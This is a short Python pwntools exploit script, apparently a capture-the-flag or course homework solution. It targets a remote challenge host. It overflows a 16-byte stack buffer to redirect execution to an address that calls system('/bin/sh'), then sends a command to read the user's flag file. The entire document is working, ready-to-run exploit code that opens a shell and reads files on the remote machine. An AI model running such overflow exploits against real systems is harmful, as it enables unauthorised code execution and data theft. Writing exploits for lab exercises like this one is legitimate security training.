from pwn import *

host = 'hw00.zoolab.org'
port = 65534

bufferSize = 0x10

# address of calling system("/bin/sh")
ret = 0x401195

def exploit(s):
    s.recvuntil('What is your name : ')
    payload = 'a' * (bufferSize + 8) + p64(ret)
    s.sendline(payload)
    s.recvuntil('Here you go\n')
    s.sendline('cat /home/`whoami`/flag')
    print (s.recvline()[:-1])

if __name__ == "__main__":
    s = remote(host, port)
    exploit(s)
    s.close()